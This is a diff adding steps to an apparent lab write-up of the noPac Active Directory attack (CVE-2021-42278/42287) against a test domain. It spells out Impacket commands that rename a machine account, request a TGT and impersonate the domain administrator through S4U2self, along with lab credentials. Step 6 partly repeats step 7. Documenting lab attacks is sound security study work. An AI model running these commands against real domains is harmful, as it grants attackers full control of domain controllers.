@@ -41,3 +41,39 @@ Technical Vulnerability: This exploits a lack of validation where the KDC can be
 
 📸 Evidence: Machine Renaming (CVE-2021-42278 Execution)
 <img width="1919" height="177" alt="image" src="https://github.com/user-attachments/assets/2f6cfac2-06e3-492a-bfe3-b557573f4864" />
+
+### 5. Ticket Request and Account Reversion (CVE-2021-42287)
+The attacker requested a Ticket Granting Ticket (TGT) for the spoofed winterfell account. Crucially, before using that ticket to request a Service Ticket, the attacker renamed the machine account back to its original name, SYSKEY$. When the KDC searched for the account associated with the TGT, it failed to find a machine account named winterfell$ and defaulted to the high-privileged Domain Controller object.
+
+Requesting TGT: getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'Password123!'
+
+Reverting Name: python3 renameMachine.py -current-name 'winterfell' -new-name 'SYSKEY$' north.sevenkingdoms.local/jon.snow:iknownothing
+
+Action: Successfully reverted the sAMAccountName attribute of the object CN=SYSKEY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local from winterfell back to SYSKEY$.
+
+Result: A valid TGT for the Domain Controller identity was saved to winterfell.ccache.
+
+### 6. Impersonation and S4U2self
+Using the acquired TGT, the attacker performed a Service-for-User-to-Self (S4U2self) request to impersonate a Domain Administrator (e.g., administrator) against the CIFS service on the Domain Controller.
+
+Command: export KRB5CCNAME=winterfell.ccache
+
+Result: Successfully acquired a Service Ticket (TGS) for CIFS/winterfell.north.sevenkingdoms.local as the Administrator.
+
+### 7. Service Ticket Acquisition via S4U2self (T1558)
+The attacker utilized the previously acquired TGT for the spoofed winterfell account to request a service ticket. Because the account name was briefly manipulated to overlap with the Domain Controller's identity, the KDC allowed the account to perform Service-for-User (S4U) operations, effectively impersonating a high-privileged user.
+
+Command: getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell'
+
+Technical Flow:
+
+CCache Retrieval: The tool identified and used the cached TGT for winterfell.
+
+Impersonation Target: The request explicitly targeted the administrator identity.
+
+S4U2self Request: An S4UByteArray and PA_FOR_USER_ENC structure were generated for administrator@north.sevenkingdoms.local.
+
+Result: A final Service Ticket (TGS) was saved as administrator@CIFS_winterfell.north.sevenkingdoms.local.ccache.
+
+Impact: The attacker now possesses an authenticated Kerberos session that grants full administrative access to the filesystem (CIFS) of the Domain Controller.
+<img width="1919" height="1024" alt="image" src="https://github.com/user-attachments/assets/9c67168d-358b-49b7-918a-10dc35f42299" />
